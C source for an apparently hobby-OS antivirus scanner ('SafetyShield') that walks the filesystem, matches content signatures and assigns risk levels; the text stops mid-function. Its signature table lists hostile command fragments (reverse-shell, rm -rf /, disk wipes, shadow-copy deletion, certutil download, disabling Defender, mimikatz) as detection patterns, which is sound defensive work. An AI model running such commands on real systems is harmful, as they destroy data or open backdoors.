/*
 * safetyshield.c - SafetyShield, the NovaOS threat scanner (see nova/safetyshield.h).
 *
 * A scan walks the whole VFS from "/" and checks every file: it reads the file
 * in chunks (hashing all of it, keeping the first bytes for magic numbers, and
 * running the content signatures over every chunk - the whole content, not
 * just the first 4 KB), then classifies it. Nothing blocks: a step timer does
 * a few milliseconds of work at a time, and a full scan is paced over about
 * two seconds so the progress bar in Settings fills smoothly and the desktop
 * stays responsive.
 *
 * Scans start automatically every minute, from safetyshield_scan() (the Scan
 * button in Settings) and - for one file, straight away - from
 * safetyshield_check_file() (the Web Browser calls it when a download
 * finishes). When a check catches something (any risk above Safe) the
 * notification "SafetyShield detected a threat in your system" appears.
 *
 * DETECTION (classify()): a file's name, extension, first bytes (magic) and a
 * bitmask of content signatures found anywhere in it map to the highest
 * matching risk level. SafetyShield reports only - it never deletes,
 * quarantines or changes a file.
 *
 *   No false positives: everything under /system is a trusted NovaOS system
 *   file and always Safe (and is not content-scanned). Documents and pictures
 *   (txt, md, html, pdf, images, ... and plain text without an extension) are
 *   only flagged for EICAR, a ransom note (note text AND payment wording), or a
 *   program hiding behind a document extension - a document that merely
 *   mentions a tool or a command is never flagged. Command strings and family
 *   names count only in programs, scripts, configs and other files.
 *
 *   Severe     ransom note (note + payment), shadow-copy deletion, reverse shell
 *   Dangerous  rm -rf / / format c: / del /f /s /q c: / disk wipes with dd,
 *              crypto-miners, droppers (certutil, download tool + run it)
 *   Trojan     double extension ending in a program (invoice.pdf.exe), fake
 *              cracks/keygens/activators, remote-access trojan names
 *   High       EICAR test file, keyloggers / credential stealers, commands that
 *              turn antivirus off
 *   Moderate   adware / browser-hijacker markers
 *   Risky      programs and scripts (.exe .msi .bat .cmd .ps1 .vbs .scr .jar
 *              .apk .sh ..., PE/ELF/Mach-O, #! scripts), an extension that lies
 *              about the content (a .jpg that is a program), .reg files
 *
 * TEST HOOKS (kernel command line, never on in the shipped system):
 *   safetyshield_test=N      flag /tmp/safetyshield-test.txt at risk level N
 *                            (1..6); the first scan runs after 5 s.
 *   safetyshield_samples=1   write harmless sample files that match the rules
 *                            (plus EICAR and some that must stay Safe) to
 *                            /tmp/ss-samples/ for testing.
 */
#include "services/svc_internal.h"
#include <nova/safetyshield.h>
#include <ctype.h>

#define SCAN_INTERVAL_MS 60000     /* automatic scan every minute               */
#define TEST_FIRST_MS    5000      /* first scan with safetyshield_test=N        */
#define STEP_MS          20        /* step timer while scanning                  */
#define STEP_BUDGET_MS   3         /* work per step                              */
#define MIN_SCAN_MS      2000      /* pace: a scan takes at least this long      */
#define CHUNK            16384     /* bytes read per vfs_read                    */
#define HEAD_MAX         4096      /* first bytes kept (magic numbers)           */
#define MAX_RECENT       4096      /* entries kept in the recent list            */
#define MAX_THREATS      256       /* threats remembered between scans           */
#define MAX_RESULTS      128       /* per-file risk remembered for file_risk()   */
#define MAX_PENDING      64        /* queued single-file checks                  */
#define MAX_NEEDLE       72        /* longest signature (>= EICAR's 68 bytes)    */

#define TEST_FILE        "/tmp/safetyshield-test.txt"
#define TEST_SIGNATURE   "novaos-safetyshield-test-signature"

/* ==== risk levels ======================================================================= */
static const char *const risk_names[SS_RISK_COUNT] = {
    "Safe", "Risky", "Moderate", "High", "Trojan", "Dangerous", "Severe",
};

static const char *const risk_summaries[SS_RISK_COUNT] = {
    "No threat found.",
    "Not harmful by itself, but comes from an unknown source or could be misused.",
    "Unwanted software that hurts privacy or performance but doesn't directly steal data or damage files.",
    "Programs or code designed to steal sensitive information, damage files, or heavily compromise system security.",
    "Malware disguised as a useful or legitimate program, which tricks you into running it and then secretly "
    "does harm in the background.",
    "Actively harmful malware that damages or deletes files or takes over parts of the system, but doesn't "
    "spread on its own.",
    "Widespread, highly dangerous, or automated malware that poses an immediate threat to your system or "
    "personal data.",
};

static const char *const risk_descriptions[SS_RISK_COUNT] = {
    "No threat found. The file is normal and does nothing harmful. Examples: documents, pictures, notes, "
    "NovaOS system files and apps.",
    "Not harmful by itself, but comes from an unknown source or could be misused. Examples: unknown programs "
    "or scripts, files with misleading names or double extensions (photo.jpg.exe), tools that change system "
    "settings.",
    "Unwanted software that hurts privacy or performance but doesn't directly steal data or damage files. "
    "Examples: adware, browser hijackers, potentially unwanted programs (PUPs), tracking tools.",
    "Programs or code designed to steal sensitive information, damage files, or heavily compromise system "
    "security. Examples: Keyloggers, credential-theft tools, spyware, banking trojans, or tools that attempt "
    "to turn off your antivirus features.",
    "Malware disguised as a useful or legitimate program, which tricks you into running it and then secretly "
    "does harm in the background. Examples: fake game cracks, fake installers or updates, email attachments "
    "pretending to be documents, remote-access trojans (RATs).",
    "Actively harmful malware that damages or deletes files or takes over parts of the system, but doesn't "
    "spread on its own. Examples: file-deleting viruses, droppers that install more malware, crypto-miners "
    "that hijack the CPU, scripts that sabotage system settings.",
    "Widespread, highly dangerous, or automated malware that poses an immediate threat to your system or "
    "personal data. Examples: Active ransomware, backdoor trojans, rootkits, or worm viruses that can spread "
    "through networks without any user input.",
};

static const uint32_t risk_colors[SS_RISK_COUNT] = {
    RGB(30, 158, 88), RGB(212, 160, 16), RGB(236, 128, 28), RGB(226, 78, 46),
    RGB(204, 40, 84), RGB(168, 28, 40), RGB(118, 26, 128),
};

static int risk_ok(int r) { return r >= 0 && r < SS_RISK_COUNT; }
const char *safetyshield_risk_name(int r) { return risk_ok(r) ? risk_names[r] : "?"; }
const char *safetyshield_risk_description(int r) { return risk_ok(r) ? risk_descriptions[r] : ""; }
const char *safetyshield_risk_summary(int r) { return risk_ok(r) ? risk_summaries[r] : ""; }
uint32_t safetyshield_risk_color(int r) { return risk_ok(r) ? risk_colors[r] : RGB(128, 128, 128); }

/* ==== content signatures =================================================================
 * A bitmask of markers found anywhere in a file's content (matched case-insensitively in
 * streaming chunks, across chunk boundaries). classify() turns them, plus the file's
 * name/extension/magic bytes, into a risk level. EICAR is matched separately (exact).
 */
enum {
    SIG_TESTSIG     = 1u << 0,
    SIG_RANSOM_NOTE = 1u << 1,
    SIG_PAYMENT     = 1u << 2,
    SIG_VSSADMIN    = 1u << 3,
    SIG_REVSHELL    = 1u << 4,
    SIG_RM_RF_ROOT  = 1u << 5,
    SIG_FORMAT_C    = 1u << 6,
    SIG_DEL_ROOT    = 1u << 7,
    SIG_DD_DISK     = 1u << 8,
    SIG_MINER       = 1u << 9,
    SIG_DL_TOOL     = 1u << 10,
    SIG_PIPE_EXEC   = 1u << 11,
    SIG_CERTUTIL    = 1u << 12,
    SIG_RAT         = 1u << 13,
    SIG_KEYLOGGER   = 1u << 14,
    SIG_MIMIKATZ    = 1u << 15,
    SIG_AV_OFF      = 1u << 16,
    SIG_ADWARE      = 1u << 17,
    SIG_EICAR       = 1u << 18,      /* set by the separate (exact) EICAR check */
};

typedef struct { uint32_t bit; const char *needle; } csig_t;

/* Needles are lowercase (content is lowercased before matching), at least 2 bytes, and
 * several may map to the same bit. They are specific command strings / family names; the
 * ransomware and dropper levels need two markers at once, and classify() ignores everything
 * but the ransom note in documents. Shell pipes end in a separator so "| sha256sum" is not
 * "| sh". */
static const csig_t csigs[] = {
    { SIG_TESTSIG,     TEST_SIGNATURE },
    /* ransom note (Severe only together with a payment marker) */
    { SIG_RANSOM_NOTE, "your files have been encrypted" },
    { SIG_RANSOM_NOTE, "files have been encrypted" },
    { SIG_RANSOM_NOTE, "all your files are encrypted" },
    { SIG_RANSOM_NOTE, "your important files are encrypted" },
    { SIG_PAYMENT,     "bitcoin" },
    { SIG_PAYMENT,     "btc wallet" },
    { SIG_PAYMENT,     "monero" },
    { SIG_PAYMENT,     "pay the ransom" },
    { SIG_PAYMENT,     "tor browser" },
    { SIG_PAYMENT,     "in order to decrypt" },
    { SIG_PAYMENT,     "send the payment" },
    /* shadow-copy deletion (ransomware) / reverse shell (backdoor) */
    { SIG_VSSADMIN,    "vssadmin delete shadows" },
    { SIG_VSSADMIN,    "vssadmin.exe delete shadows" },
    { SIG_VSSADMIN,    "wmic shadowcopy delete" },
    { SIG_REVSHELL,    "bash -i >& /dev/tcp" },
    { SIG_REVSHELL,    "sh -i >& /dev/tcp" },
    { SIG_REVSHELL,    "nc -e /bin/" },
    /* destructive commands */
    { SIG_RM_RF_ROOT,  "rm -rf /*" },
    { SIG_RM_RF_ROOT,  "rm -rf / " },
    { SIG_RM_RF_ROOT,  "rm -rf /;" },
    { SIG_RM_RF_ROOT,  "rm -rf /\n" },
    { SIG_RM_RF_ROOT,  "rm -rf /\r" },
    { SIG_RM_RF_ROOT,  "rm -rf ~/*" },
    { SIG_RM_RF_ROOT,  "rm -rf ~ " },
    { SIG_RM_RF_ROOT,  "rm -rf ~\n" },
    { SIG_RM_RF_ROOT,  "--no-preserve-root" },
    { SIG_FORMAT_C,    "format c:" },
    { SIG_DEL_ROOT,    "del /f /s /q c:" },
    { SIG_DEL_ROOT,    "rd /s /q c:" },
    { SIG_DD_DISK,     "if=/dev/zero of=/dev/" },
    { SIG_DD_DISK,     "if=/dev/urandom of=/dev/" },
    /* crypto-miners */
    { SIG_MINER,       "stratum+tcp://" },
    { SIG_MINER,       "stratum+ssl://" },
    { SIG_MINER,       "xmrig" },
    { SIG_MINER,       "minerd" },
    { SIG_MINER,       "cryptonight" },
    { SIG_MINER,       "--donate-level" },
    { SIG_MINER,       "coinhive" },
    /* droppers: a download tool together with a run-it marker */
    { SIG_DL_TOOL,     "invoke-webrequest" },
    { SIG_DL_TOOL,     "new-object net.webclient" },
    { SIG_DL_TOOL,     "downloadstring" },
    { SIG_DL_TOOL,     "bitsadmin /transfer" },
    { SIG_DL_TOOL,     "curl " },
    { SIG_DL_TOOL,     "wget " },
    { SIG_PIPE_EXEC,   "| sh\n" },
    { SIG_PIPE_EXEC,   "| sh " },
    { SIG_PIPE_EXEC,   "| sh;" },
    { SIG_PIPE_EXEC,   "| sh\r" },
    { SIG_PIPE_EXEC,   "|sh\n" },
    { SIG_PIPE_EXEC,   "|sh " },
    { SIG_PIPE_EXEC,   "| bash\n" },
    { SIG_PIPE_EXEC,   "| bash " },
    { SIG_PIPE_EXEC,   "| bash;" },
    { SIG_PIPE_EXEC,   "| bash\r" },
    { SIG_PIPE_EXEC,   "|bash\n" },
    { SIG_PIPE_EXEC,   "|bash " },
    { SIG_PIPE_EXEC,   "| sudo sh" },
    { SIG_PIPE_EXEC,   "| sudo bash" },
    { SIG_PIPE_EXEC,   "iex(" },
    { SIG_PIPE_EXEC,   "iex (" },
    { SIG_PIPE_EXEC,   "start-process" },
    { SIG_CERTUTIL,    "certutil -urlcache" },
    { SIG_CERTUTIL,    "certutil.exe -urlcache" },
    /* remote-access trojan family names */
    { SIG_RAT,         "njrat" },
    { SIG_RAT,         "darkcomet" },
    { SIG_RAT,         "quasarrat" },
    { SIG_RAT,         "quasar.client" },
    { SIG_RAT,         "remcos" },
    { SIG_RAT,         "nanocore" },
    { SIG_RAT,         "asyncrat" },
    { SIG_RAT,         "venomrat" },
    /* keyloggers / credential stealers */
    { SIG_KEYLOGGER,   "keylogger" },
    { SIG_KEYLOGGER,   "keystroke logger" },
    { SIG_MIMIKATZ,    "mimikatz" },
    { SIG_MIMIKATZ,    "sekurlsa::logonpasswords" },
    { SIG_MIMIKATZ,    "lsadump::" },
    { SIG_MIMIKATZ,    "lazagne" },
    /* turning antivirus off */
    { SIG_AV_OFF,      "disablerealtimemonitoring" },
    { SIG_AV_OFF,      "set-mppreference -disable" },
    { SIG_AV_OFF,      "net stop windefend" },
    { SIG_AV_OFF,      "sc stop windefend" },
    /* adware / browser hijackers */
    { SIG_ADWARE,      "istartsurf" },
    { SIG_ADWARE,      "delta-homes" },
    { SIG_ADWARE,      "search.conduit" },
    { SIG_ADWARE,      "default search engine has been changed" },
};
#define NCSIG ((int)(sizeof csigs / sizeof csigs[0]))

/* programs/scripts; extensions that claim to be a document or picture; documents (rules for
   commands and family names do not apply to these) */
#define EXEC_EXT      "exe,msi,bat,cmd,ps1,vbs,scr,jar,apk,sh,com,pif,hta,wsf,cpl"
#define DOC_MEDIA_EXT "jpg,jpeg,png,gif,bmp,webp,svg,pdf,txt,md,doc,docx,xls,xlsx,ppt,pptx,mp3,mp4,wav,avi,mov,rtf,csv"
#define DOC_EXT       DOC_MEDIA_EXT ",html,htm,log,odt,note,ppm"

static int test_risk;      /* safetyshield_test=N on the command line (0 = off) */

/* EICAR (eicar.org standard antivirus test string), assembled at run time from fragments so
 * the contiguous test string is not a literal in the source. */
static char eicar[MAX_NEEDLE];
static uint32_t eicar_len;

/* fast matcher: lowercase table, and the needles chained by their first byte */
static uint8_t lc_tab[256];
static int16_t chain_first[256], chain_next[NCSIG];
static uint8_t needle_len[NCSIG];

/* ==== state ================================================================================== */
typedef struct { char *path; uint8_t risk; char rule[48]; } rec_t;

static bool running, scanning, single, manual, notified, scan_requested;
static uint32_t scan_id, gen;
static int scanned, total, threats;
static uint32_t last_scan_time, next_scan_ms, scan_start_ms;
static int step_timer;

static char **dirs;  static int ndirs, capdirs;      /* directories still to walk      */
static char **queue; static int nqueue, capqueue;    /* files of the walked directories */

/* the file being read */
static char *cur_path;
static int cur_fd = -1;
static bool cur_trusted;
static uint32_t cur_size, cur_hash, cur_head_len, cur_sig;
static uint8_t *cur_head, *chunk;
static uint8_t *scan_buf, *scan_lc;                  /* overlap tail + chunk, and lowercased */
static uint8_t scan_tail[MAX_NEEDLE];
static int scan_taillen;

static rec_t recent[MAX_RECENT];
static int rec_head, rec_n;

static uint32_t prev_threats[MAX_THREATS], cur_threats[MAX_THREATS];
static int nprev, ncur;

static struct { char *path; int risk; } results[MAX_RESULTS];
static int nresults;

static char *pending[MAX_PENDING];
static int npending;

/* ==== small helpers ========================================================================== */
static bool push(char ***arr, int *n, int *cap, const char *s) {
    if (*n == *cap) {
        int nc = *cap ? *cap * 2 : 64;
        char **na = krealloc(*arr, sizeof *na * (size_t)nc);
        if (!na) return false;
        *arr = na;
        *cap = nc;
    }
    char *p = strdup(s);
    if (!p) return false;
    (*arr)[(*n)++] = p;
    return true;
}

static void clear_list(char **arr, int *n) {
    for (int i = 0; i < *n; i++) kfree(arr[i]);
    *n = 0;
}

static uint32_t fnv(uint32_t h, const uint8_t *p, uint32_t n) {
    for (uint32_t i = 0; i < n; i++) { h ^= p[i]; h *= 16777619u; }
    return h;
}

static uint32_t threat_key(const char *path, int risk) {
    return fnv(2166136261u ^ (uint32_t)risk, (const uint8_t *)path, (uint32_t)strlen(path));
}

/* byte-exact substring search (binary content, embedded NULs and all) */
static bool find_bytes(const uint8_t *hay, int hl, const char *needle, int nl) {
    if (nl <= 0 || hl < nl) return false;
    uint8_t c0 = (uint8_t)needle[0];
    for (int i = 0; i + nl <= hl; i++)
        if (hay[i] == c0 && !memcmp(hay + i, needle, (size_t)nl)) return true;
    return false;
}

static bool ext_in(const char *ext, const char *list) {
    if (!ext || !*ext) return false;
    size_t el = strlen(ext);
    for (const char *p = list; *p; ) {
        const char *c = strchr(p, ',');
        size_t len = c ? (size_t)(c - p) : strlen(p);
        if (len == el && !strncasecmp(p, ext, len)) return true;
        if (!c) break;
        p = c + 1;
    }
    return false;
}

static bool magic_exec(const uint8_t *h, uint32_t n) {
    if (n >= 2 && h[0] == 'M' && h[1] == 'Z') return true;                       /* PE / DOS */
    if (n >= 4 && h[0] == 0x7F && h[1] == 'E' && h[2] == 'L' && h[3] == 'F') return true;  /* ELF */
    if (n >= 4) {
        uint32_t m = (uint32_t)h[0] | (uint32_t)h[1] << 8 | (uint32_t)h[2] << 16 | (uint32_t)h[3] << 24;
        if (m == 0xFEEDFACEu || m == 0xFEEDFACFu || m == 0xCEFAEDFEu || m == 0xCFFAEDFEu ||
            m == 0xCAFEBABEu || m == 0xBEBAFECAu) return true;                   /* Mach-O */
    }
    return false;
}

static bool magic_script(const uint8_t *h, uint32_t n) { return n >= 2 && h[0] == '#' && h[1] == '!'; }

/* `w` in the name as a whole word ("game_crack.exe" yes, "Nutcracker.exe" no) */
static bool name_has_word(const char *name, const char *w) {
    size_t wl = strlen(w);
    for (const char *p = name; (p = strcasestr(p, w)) != NULL; p++) {
        bool before = p == name || !isalpha((unsigned char)p[-1]);
        bool after = !isalpha((unsigned char)p[wl]);
        if (before && after) return true;
    }
    return false;
}

static bool crack_name(const char *name) {
    return name_has_word(name, "crack") || name_has_word(name, "cracked") || name_has_word(name, "keygen") ||
           name_has_word(name, "activator") || name_has_word(name, "nulled") || name_has_word(name, "warez");
}

/* name like invoice.pdf.exe / photo.jpg.scr: a program hiding behind a document/media extension */
static bool double_ext_exe(const char *name) {
    const char *last = strrchr(name, '.');
    if (!last || last == name) return false;
    const char *p = last - 1;
    while (p > name && *p != '.') p--;
    if (*p != '.') return false;
    char prev[16];
    size_t plen = (size_t)(last - (p + 1));
    if (plen == 0 || plen >= sizeof prev) return false;
    memcpy(prev, p + 1, plen);
    prev[plen] = 0;
    return ext_in(last + 1, EXEC_EXT) && ext_in(prev, DOC_MEDIA_EXT);
}

static bool is_trusted(const char *path) { return !strncmp(path, "/system/", 8); }

/* ==== recent list ============================================================================ */
static void recent_clear(void) {
    for (int i = 0; i < MAX_RECENT; i++) { kfree(recent[i].path); recent[i].path = NULL; }
    rec_head = rec_n = 0;
}

static void recent_add(const char *path, int risk, const char *rule) {
    rec_t *r = &recent[rec_head];
    kfree(r->path);
    r->path = strdup(path);
    r->risk = (uint8_t)risk;
    strlcpy(r->rule, rule ? rule : "", sizeof r->rule);
    rec_head = (rec_head + 1) % MAX_RECENT;
    if (rec_n < MAX_RECENT) rec_n++;
}

int safetyshield_recent_count(void) { return rec_n; }

bool safetyshield_recent_get(int index, safetyshield_entry_t *out) {
    if (index < 0 || index >= rec_n || !out) return false;
    const rec_t *r = &recent[((rec_head - 1 - index) % MAX_RECENT + MAX_RECENT) % MAX_RECENT];
    strlcpy(out->path, r->path ? r->path : "", sizeof out->path);
    out->risk = r->risk;
    strlcpy(out->rule, r->rule, sizeof out->rule);
    return true;
}

uint32_t safetyshield_generation(void) { return gen; }

/* ==== per-file risk (file_risk) ============================================================== */
static void result_set(const char *path, int risk) {
    for (int i = 0; i < nresults; i++)
        if (!strcmp(results[i].path, path)) {
            if (results[i].risk != risk) { results[i].risk = risk; gen++; }
            return;
        }
    if (nresults >= MAX_RESULTS) {         /* forget the oldest */
        kfree(results[0].path);
        memmove(results, results + 1, sizeof results[0] * (MAX_RESULTS - 1));
        nresults--;
    }
    char *p = strdup(path);
    if (!p) return;
    results[nresults].path = p;
    results[nresults].risk = risk;
    nresults++;
    gen++;
}

int safetyshield_file_risk(const char *path) {
    if (!path) return -1;
    for (int i = 0; i < nresults; i++)
        if (!strcmp(results[i].path, path)) return results[i].risk;
    return -1;
}

/* ==== counting every file ===================================================================== */
static int count_files(const char *dir, int depth) {
    int n = vfs_list(dir, NULL, 0);
    if (n <= 0) return 0;
    vfs_dirent_t *e = kcalloc((size_t)n, sizeof *e);
    if (!e) return 0;
    int got = MIN(vfs_list(dir, e, n), n), files = 0;
    for (int i = 0; i < got; i++) {
        if (!e[i].is_dir) { files++; continue; }
        if (depth < 64) {
            char path[VFS_PATH_MAX];
            vfs_join(dir, e[i].name, path);
            files += count_files(path, depth + 1);
        }
    }
    kfree(e);
    return files;
}

int safetyshield_total_files(void) {
    static uint32_t cached_gen = 0xFFFFFFFFu;
    static int cached;
    if (vfs_generation() != cached_gen) {
        cached = count_files("/", 0);
        cached_gen = vfs_generation();
    }
    return cached;
}

/* ==== classification ========================================================================= */
/* Map the current file's name, extension, magic bytes and content signatures to the highest
 * matching risk. Reports only - nothing is deleted or changed. */
static int classify(const char **out_rule) {
    *out_rule = "";
    if (cur_trusted) return SS_RISK_SAFE;                 /* NovaOS system files are always Safe */
    const char *name = vfs_basename(cur_path);
    const char *ext = vfs_extension(cur_path);
    bool prog = magic_exec(cur_head, cur_head_len), script = magic_script(cur_head, cur_head_len);
    /* a document or picture (or plain text without an extension): mentioning a tool or a
       command in it is not a threat */
    bool doc = ext && *ext ? ext_in(ext, DOC_EXT) : !prog && !script;
    uint32_t s = cur_sig;
    int risk = SS_RISK_SAFE;
    const char *rn = "";
#define BUMP(rk, nm) do { if ((rk) > risk) { risk = (rk); rn = (nm); } } while (0)

    /* any file */
    if (s & SIG_EICAR) BUMP(SS_RISK_HIGH, "EICAR test file");
    if (test_risk && (s & SIG_TESTSIG)) BUMP(test_risk, "Test signature");
    if ((s & SIG_RANSOM_NOTE) && (s & SIG_PAYMENT)) BUMP(SS_RISK_SEVERE, "Ransomware note");
    if (double_ext_exe(name)) BUMP(SS_RISK_TROJAN, "Disguised program (double extension)");
    if (crack_name(name) && (ext_in(ext, EXEC_EXT) || prog)) BUMP(SS_RISK_TROJAN, "Fake crack / keygen");
    if (ext_in(ext, "reg")) BUMP(SS_RISK_RISKY, "Windows registry script");
    if (ext_in(ext, EXEC_EXT)) BUMP(SS_RISK_RISKY, "Unknown program or script");
    if (prog) BUMP(SS_RISK_RISKY, ext_in(ext, DOC_MEDIA_EXT) ? "Extension does not match content" : "Unknown program");
    else if (script && !ext_in(ext, EXEC_EXT))
        BUMP(SS_RISK_RISKY, ext_in(ext, DOC_MEDIA_EXT) ? "Extension does not match content" : "Unknown script");

    /* programs, scripts, configs and other files */
    if (!doc) {
        if (s & SIG_VSSADMIN) BUMP(SS_RISK_SEVERE, "Shadow-copy deletion (ransomware)");
        if (s & SIG_REVSHELL) BUMP(SS_RISK_SEVERE, "Backdoor (reverse shell)");
        if (s & (SIG_RM_RF_ROOT | SIG_FORMAT_C | SIG_DEL_ROOT)) BUMP(SS_RISK_DANGEROUS, "Destructive command");
        if (s & SIG_DD_DISK) BUMP(SS_RISK_DANGEROUS, "Disk-wiping command");
        if (s & SIG_MINER) BUMP(SS_RISK_DANGEROUS, "Crypto-miner");
        if (s & SIG_CERTUTIL) BUMP(SS_RISK_DANGEROUS, "Dropper (certutil download)");
        if ((s & SIG_DL_TOOL) && (s & SIG_PIPE_EXEC)) BUMP(SS_RISK_DANGEROUS, "Dropper (downloads and runs code)");
        if (s & SIG_RAT) BUMP(SS_RISK_TROJAN, "Remote-access trojan");
        if (s & SIG_AV_OFF) BUMP(SS_RISK_HIGH, "Turns antivirus off");
        if (s & SIG_MIMIKATZ) BUMP(SS_RISK_HIGH, "Credential stealer");
        if (s & SIG_KEYLOGGER) BUMP(SS_RISK_HIGH, "Keylogger / spyware");
        if (s & SIG_ADWARE) BUMP(SS_RISK_MODERATE, "Adware / browser hijacker");
    }
#undef BUMP
    *out_rule = rn;
    return risk;
}

/* ==== scanning ================================================================================ */
static void build_tables(void) {
    for (int c = 0; c < 256; c++) {
        lc_tab[c] = (uint8_t)tolower(c);
        chain_first[c] = -1;
    }
    for (int i = NCSIG - 1; i >= 0; i--) {
        size_t n = strlen(csigs[i].needle);
        needle_len[i] = (uint8_t)MIN(n, (size_t)(MAX_NEEDLE - 1));
        chain_next[i] = -1;
        if (n < 2 || n >= MAX_NEEDLE) continue;
        uint8_t f = (uint8_t)csigs[i].needle[0];
        chain_next[i] = chain_first[f];
        chain_first[f] = (int16_t)i;
    }
}

/* Run the content signatures over one chunk in a single pass, keeping an overlap tail so a
 * signature split across two chunks is still found. Sets bits in cur_sig. */
static void scan_chunk(const uint8_t *data, int n) {
    int base = scan_taillen, len = base + n;
    memcpy(scan_buf, scan_tail, (size_t)base);
    memcpy(scan_buf + base, data, (size_t)n);
    for (int i = 0; i < len; i++) scan_lc[i] = lc_tab[scan_buf[i]];
    if (!(cur_sig & SIG_EICAR) && eicar_len && find_bytes(scan_buf, len, eicar, (int)eicar_len))
        cur_sig |= SIG_EICAR;
    for (int i = 0; i < len; i++)
        for (int k = chain_first[scan_lc[i]]; k >= 0; k = chain_next[k]) {
            int nl = needle_len[k];
            if ((cur_sig & csigs[k].bit) || i + nl > len) continue;
            const char *nd = csigs[k].needle;
            if (scan_lc[i + 1] == (uint8_t)nd[1] && !memcmp(scan_lc + i + 2, nd + 2, (size_t)(nl - 2)))
                cur_sig |= csigs[k].bit;
        }
    int keep = MIN(len, MAX_NEEDLE - 1);
    memmove(scan_tail, scan_buf + len - keep, (size_t)keep);
    scan_taillen = keep;
}

static void close_current(void) {
    if (cur_fd >= 0) vfs_close(cur_fd);
    cur_fd = -1;
    kfree(cur_path);
    cur_path = NULL;
}

static void reset_walk(void) {
    close_current();
    clear_list(dirs, &ndirs);
    clear_list(queue, &nqueue);
}

static void open_file(const char *path) {
    cur_path = strdup(path);
    cur_fd = cur_path ? vfs_open(cur_path, VFS_O_READ) : -1;
    cur_trusted = cur_path && is_trusted(cur_path);
    cur_size = cur_head_len = cur_sig = 0;
    cur_hash = 2166136261u;
    scan_taillen = 0;
    vfs_stat_t st;
    if (cur_path && vfs_stat(cur_path, &st) == 0) cur_size = st.size;
}

static bool threat_known(uint32_t key) {
    for (int i = 0; i < nprev; i++) if (prev_threats[i] == key) return true;
    return false;
}

static void report_threat(const char *path, int risk, const char *rule) {
    threats++;
    uint32_t key = threat_key(path, risk);
    if (ncur < MAX_THREATS) cur_threats[ncur++] = key;
    bool known = threat_known(key);
    log_warn("safetyshield", "%s: %s (rule: %s)", risk_names[risk], path, rule && *rule ? rule : "-");
    if (!notified && (manual || !known)) {
        notified = true;
        notify("SafetyShield", "SafetyShield detected a threat in your system", ICON_SHIELD);
    }
}

/* All bytes read: classify and record the current file. */
static void finish_file(void) {
    const char *rule = "";
    int risk = classify(&rule);
    recent_add(cur_path, risk, rule);
    result_set(cur_path, risk);
    if (scanning) {
        if (risk > SS_RISK_SAFE) report_threat(cur_path, risk, rule);
        scanned++;
    } else if (risk > SS_RISK_SAFE) {      /* single-file check: tell the user straight away */
        uint32_t key = threat_key(cur_path, risk);
        if (!threat_known(key) && nprev < MAX_THREATS) prev_threats[nprev++] = key;   /* no repeat toast */
        log_warn("safetyshield", "%s: %s (rule: %s)", risk_names[risk], cur_path, rule && *rule ? rule : "-");
        notify("SafetyShield", "SafetyShield detected a threat in your system", ICON_SHIELD);
    } else {
        log_info("safetyshield", "checked %s: Safe", cur_path);
    }
    close_current();
}

static void finish_scan(void) {
    scanning = false;
    reset_walk();
    total = scanned;
    last_scan_time = sys_time();
    memcpy(prev_threats, cur_threats, sizeof(uint32_t) * (size_t)ncur);
    nprev = ncur;
    log_info("safetyshield", "scan finished: %d files in %u ms, %d threat%s found", scanned,
             sys_uptime_ms() - scan_start_ms, threats, threats == 1 ? "" : "s");
    if (npending) single = true;           /* downloads queued meanwhile: check them next */
    else if (step_timer) { timer_cancel(step_timer); step_timer = 0; }
    gen++;
}

/* Take the next file: from the queue, else walk the next directory. false = nothing left. */
static bool next_file(void) {
    while (!nqueue) {
        if (!ndirs) return false;
        char *dir = dirs[--ndirs];
        int n = vfs_list(dir, NULL, 0);
        if (n > 0) {
            vfs_dirent_t *e = kcalloc((size_t)n, sizeof *e);
            if (e) {
                int got = MIN(vfs_list(dir, e, n), n);
                /* queue files in reverse so they are scanned in name order; subdirectories after */
                for (int i = got - 1; i >= 0; i--) {
                    char path[VFS_PATH_MAX];
                    vfs_join(dir, e[i].name, path);
                    if (e[i].is_dir) push(&dirs, &ndirs, &capdirs, path);
                    else push(&queue, &nqueue, &capqueue, path);
                }
                kfree(e);
            }
        }
        kfree(dir);
    }
    char *path = queue[--nqueue];
    open_file(path);
    kfree(path);
    return true;
}

/* Pop the next queued single-file check into the current file. false = queue empty. */
static bool next_single(void) {
    if (npending == 0) return false;
    char *path = pending[0];
    memmove(pending, pending + 1, sizeof pending[0] * (size_t)(--npending));
    open_file(path);
    kfree(path);
    return true;
}

static void start_scan(bool by_user);

static void read_current_chunk(void) {
    int r = vfs_read(cur_fd, chunk, CHUNK);
    if (r <= 0) { finish_file(); return; }
    cur_hash = fnv(cur_hash, chunk, (uint32_t)r);
    if (cur_head_len < HEAD_MAX) {
        uint32_t k = MIN((uint32_t)r, HEAD_MAX - cur_head_len);
        memcpy(cur_head + cur_head_len, chunk, k);
        cur_head_len += k;
    }
    if (!cur_trusted) scan_chunk(chunk, r);
}

static void scan_step(void *ctx) {
    (void)ctx;
    if (!scanning && !single) {
        if (step_timer) { timer_cancel(step_timer); step_timer = 0; }
        return;
    }
    uint32_t t0 = g_ticks;
    int allowed = scanning ? (int)((int64_t)total * (sys_uptime_ms() - scan_start_ms + STEP_MS) / MIN_SCAN_MS) : 0;
    while (g_ticks - t0 < STEP_BUDGET_MS) {
        if (!cur_path) {
            if (scanning) {
                if (scanned >= MAX(allowed, 1)) break;
                if (!next_file()) { finish_scan(); return; }
            } else if (!next_single()) {   /* single-file checks done */
                single = false;
                if (scan_requested) { scan_requested = false; start_scan(true); return; }
                if (step_timer) { timer_cancel(step_timer); step_timer = 0; }
                return;
            }
        }
        if (cur_fd < 0) {                  /* could not be opened (gone, a folder): not listed */
            if (scanning) scanned++;
            close_current();
            continue;
        }
        read_current_chunk();
    }
    if (scanning && scanned > total) total = scanned;     /* files added during the scan */
    gen++;
}

static void ensure_timer(void) {
    if (!step_timer) step_timer = timer_add(STEP_MS, scan_step, NULL, true);
}

static void start_scan(bool by_user) {
    reset_walk();
    recent_clear();
    scanning = true;
    manual = by_user;
    notified = false;
    scan_id++;
    scanned = threats = 0;
    ncur = 0;
    total = safetyshield_total_files();
    scan_start_ms = sys_uptime_ms();
    next_scan_ms = scan_start_ms + SCAN_INTERVAL_MS;
    push(&dirs, &ndirs, &capdirs, "/");
    ensure_timer();
    log_info("safetyshield", "%s scan started: %d files", by_user ? "manual" : "automatic", total);
    gen++;
}

int safetyshield_scan(void) {
    if (!running) return -1;
    if (scanning) return 1;
    if (single) { scan_requested = true; return 0; }   /* runs right after the download check */
    start_scan(true);
    return 0;
}

void safetyshield_check_file(const char *path) {
    if (!running || !path || !*path) return;
